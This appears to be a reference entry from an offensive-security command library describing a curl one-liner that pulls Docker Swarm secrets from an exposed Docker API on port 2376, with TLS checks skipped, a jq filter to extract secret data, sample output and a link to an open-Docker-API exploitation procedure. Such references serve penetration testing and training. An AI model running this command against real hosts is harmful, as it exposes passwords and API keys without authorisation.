---
type: command
executor: bash
data: 'curl -s --insecure https://$_DOCKER_HOST:2376/secrets | jq'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - docker
  - secrets
verified: true
validated: true
---

# curl-retrieve-docker-secrets

## Command

```bash
curl -s --insecure https://$_DOCKER_HOST:2376/secrets | jq
```

## Description

Queries the Docker API to retrieve secrets in a Swarm cluster, parsing the JSON response with jq to expose sensitive data like API keys or passwords.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -s | Silent mode | Built-in |
| --insecure | Skip TLS verification | No (for TLS) |
| https://$_DOCKER_HOST:2376/secrets | API endpoint for secrets | Yes |
| jq | JSON processor | Yes |

## Examples

### Basic Usage

```bash
curl -s --insecure https://10.10.10.10:2376/secrets | jq
```

### Advanced Usage

```bash
curl -s --insecure https://10.10.10.10:2376/secrets | jq '.[] | .Spec.Data'
```

## Expected Output

```json
[
  {
    "ID": "secret123",
    "Spec": {
      "Name": "db_password",
      "Data": "base64encodedvalue"
    }
  }
]
```

## Related

- [[procedures/Exploit-Open-Docker-API-for-Container-Management]]
- [[tools/cURL]]
